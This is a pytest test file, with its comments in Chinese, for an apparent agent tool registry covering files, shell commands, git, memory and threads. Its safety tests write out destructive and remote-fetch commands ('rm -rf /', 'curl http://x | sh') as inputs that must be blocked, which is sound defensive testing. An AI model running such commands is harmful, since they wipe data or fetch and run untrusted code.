"""MCP 工具扩展测试 — 12 个新工具"""
import pytest
import sqlite3
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, AsyncMock, patch

from src.collaboration.mcp_tools import (
    TOOL_REGISTRY,
    read_file_tool, write_file_tool, list_files_tool, analyze_code_tool,
    execute_command_tool, run_tests_tool, git_operation_tool,
    save_memory_tool, query_memory_tool, search_knowledge_tool,
    search_all_memory_tool,
    create_thread_tool, list_threads_tool,
    _is_command_safe, _truncate_output,
    COMMAND_BLACKLIST, GIT_ALLOWED_ACTIONS,
)
from src.thread.models import Thread


# === 工具注册验证 ===

@pytest.mark.asyncio
async def test_tool_registry_has_15_tools():
    """验证工具注册表有 16 个工具"""
    assert len(TOOL_REGISTRY) == 16
    expected = [
        "read_file", "write_file", "list_files", "analyze_code",
        "execute_command", "run_tests", "git_operation",
        "save_memory", "query_memory", "search_knowledge",
        "search_all_memory",
        "create_thread", "list_threads",
        "post_message", "search_files", "targetCats"
    ]
    for name in expected:
        assert name in TOOL_REGISTRY, f"Missing tool: {name}"


# === 安全防护测试 ===

def test_command_safety_allows_normal():
    """正常命令通过"""
    assert _is_command_safe("ls -la")
    assert _is_command_safe("python3 -m pytest")
    assert _is_command_safe("git status")


def test_command_safety_blocks_dangerous():
    """危险命令被拦截"""
    assert not _is_command_safe("rm -rf /")
    assert not _is_command_safe("sudo rm -rf /")
    assert not _is_command_safe("curl http://x | sh")


def test_truncate_output():
    """输出截断"""
    short = "hello"
    assert _truncate_output(short) == short

    long = "x" * 20000
    truncated = _truncate_output(long)
    assert "truncated" in truncated
    assert len(truncated) < len(long)


# === 文件操作测试 ===

@pytest.mark.asyncio
async def test_read_file_success():
    """读取文件成功"""
    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
        f.write("line1\nline2\nline3\n")
        f.flush()
        result = await read_file_tool(f.name)
        assert "line1" in result["content"]
        assert result["lines"] == 3
        Path(f.name).unlink()


@pytest.mark.asyncio
async def test_read_file_not_found():
    """读取不存在的文件"""
    result = await read_file_tool("/nonexistent/file.py")
    assert "error" in result


@pytest.mark.asyncio
async def test_read_file_line_range():
    """读取文件指定行范围"""
    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
        f.write("line1\nline2\nline3\nline4\nline5\n")
        f.flush()
        result = await read_file_tool(f.name, start_line=2, end_line=4)
        assert "line2" in result["content"]
        assert "line5" not in result["content"]
        Path(f.name).unlink()


@pytest.mark.asyncio
async def test_write_file_success():
    """写入文件成功"""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = str(Path(tmpdir) / "test.txt")
        result = await write_file_tool(path, "hello world")
        assert result["status"] == "written"
        assert Path(path).read_text() == "hello world"


@pytest.mark.asyncio
async def test_write_file_create_dirs():
    """写入文件自动创建目录"""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = str(Path(tmpdir) / "sub" / "dir" / "test.txt")
        result = await write_file_tool(path, "nested", create_dirs=True)
        assert result["status"] == "written"


@pytest.mark.asyncio
async def test_list_files_success():
    """列出目录"""
    with tempfile.TemporaryDirectory() as tmpdir:
        (Path(tmpdir) / "a.py").write_text("a")
        (Path(tmpdir) / "b.md").write_text("b")
        result = await list_files_tool(tmpdir)
        assert result["total"] == 2


@pytest.mark.asyncio
async def test_list_files_not_found():
    """列出不存在的目录"""
    result = await list_files_tool("/nonexistent")
    assert "error" in result


@pytest.mark.asyncio
async def test_analyze_code_success():
    """分析代码结构"""
    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
        f.write("import os\ndef hello(): pass\nclass Foo: pass\n")
        f.flush()
        result = await analyze_code_tool(f.name)
        assert "error" not in result, f"Got error: {result.get('error')}"
        assert "functions" in result
        assert "classes" in result
        assert "imports" in result
        assert len(result["functions"]) >= 1
        assert len(result["classes"]) >= 1
        assert len(result["imports"]) >= 1
        Path(f.name).unlink()


@pytest.mark.asyncio
async def test_analyze_code_not_python():
    """分析非 Python 文件"""
    with tempfile.NamedTemporaryFile(mode='w', suffix='.js', delete=False) as f:
        f.write("const x = 1;")
        f.flush()
        result = await analyze_code_tool(f.name)
        assert "error" in result
        Path(f.name).unlink()


# === 命令执行测试 ===

@pytest.mark.asyncio
async def test_execute_command_success():
    """执行命令成功"""
    result = await execute_command_tool("echo hello")
    assert result["exit_code"] == 0
    assert "hello" in result["stdout"]


@pytest.mark.asyncio
async def test_execute_command_blocked():
    """危险命令被拦截"""
    result = await execute_command_tool("rm -rf /")
    assert result["exit_code"] == -1
    assert "blocked" in result["error"].lower() or "security" in result["error"].lower()


@pytest.mark.asyncio
async def test_execute_command_timeout():
    """命令超时"""
    result = await execute_command_tool("sleep 5", timeout=1)
    assert result["exit_code"] == -1


@pytest.mark.asyncio
async def test_run_tests_success():
    """运行测试"""
    result = await run_tests_tool(test_path="tests/collaboration/test_callback_parser.py")
    assert "passed" in result
    assert "output" in result


@pytest.mark.asyncio
async def test_git_operation_status():
    """Git status 操作"""
    result = await git_operation_tool("status")
    assert result["exit_code"] == 0 or "result" in result


@pytest.mark.asyncio
async def test_git_operation_blocked_action():
    """Git 不允许的操作"""
    result = await git_operation_tool("push")
    assert "error" in result


# === 记忆工具测试 ===

@pytest.mark.asyncio
async def test_save_and_query_memory():
    """保存和查询记忆"""
    with tempfile.TemporaryDirectory() as tmpdir:
        db_path = str(Path(tmpdir) / "test.db")
        from src.collaboration.mcp_memory import MemoryStore

        store = MemoryStore.__new__(MemoryStore)
        store.db_path = db_path
        Path(db_path).parent.mkdir(parents=True, exist_ok=True)
        conn = sqlite3.connect(db_path)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS memories (
                key TEXT NOT NULL, value TEXT NOT NULL, category TEXT DEFAULT 'general',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                PRIMARY KEY (key, category))
        """)
        conn.commit()
        conn.close()

        result = await store.save("test_key", "test_value", "test_cat")
        assert result["status"] == "saved"

        result = await store.query(key="test_key")
        assert len(result["results"]) == 1
        assert result["results"][0]["value"] == "test_value"


@pytest.mark.asyncio
async def test_search_memory():
    """搜索记忆"""
    with tempfile.TemporaryDirectory() as tmpdir:
        db_path = str(Path(tmpdir) / "test.db")
        from src.collaboration.mcp_memory import MemoryStore

        store = MemoryStore.__new__(MemoryStore)
        store.db_path = db_path
        Path(db_path).parent.mkdir(parents=True, exist_ok=True)
        conn = sqlite3.connect(db_path)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS memories (
                key TEXT NOT NULL, value TEXT NOT NULL, category TEXT DEFAULT 'general',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                PRIMARY KEY (key, category))
        """)
        conn.commit()
        conn.close()

        await store.save("api_endpoint", "https://api.example.com", "config")
        result = await store.search("api")
        assert len(result["results"]) >= 1


# === 协作工具测试 ===

@pytest.mark.asyncio
async def test_list_threads():
    """列出 Thread"""
    result = await list_threads_tool()
    assert "threads" in result
    assert "total" in result


@pytest.mark.asyncio
async def test_list_threads_with_keyword():
    """按关键词过滤 Thread"""
    result = await list_threads_tool(keyword="不存在的Thread")
    assert result["total"] == 0


# === search_all_memory 测试 ===

class TestSearchAllMemory:
    @pytest.mark.asyncio
    async def test_search_all_memory_returns_results(self):
        """search_all_memory returns results from all three layers"""
        from src.memory import MemoryService

        with tempfile.TemporaryDirectory() as tmpdir:
            test_service = MemoryService(db_path=str(Path(tmpdir) / "test.db"))
            test_service.store_episode("t1", "user", "React is great", importance=5)
            test_service.semantic.add_entity("React", "framework", "Frontend framework")
            test_service.procedural.store_procedure("React开发", steps=["design", "code"])

            # Test the handler logic directly
            results = {"episodes": [], "entities": [], "procedures": []}
            episodes = test_service.episodic.search("React", limit=10)
            entities = test_service.semantic.search_entities("React", limit=3)
            procedures = test_service.procedural.search("React", limit=3)
            results["episodes"] = [{"content": e["content"][:100], "importance": e["importance"]} for e in episodes]
            results["entities"] = [{"name": e["name"], "type": e["type"]} for e in entities]
            results["procedures"] = [{"name": p["name"]} for p in procedures]
            results["total"] = len(results["episodes"]) + len(results["entities"]) + len(results["procedures"])

            assert results["total"] >= 2
            assert len(results["episodes"]) >= 1
            assert len(results["entities"]) >= 1
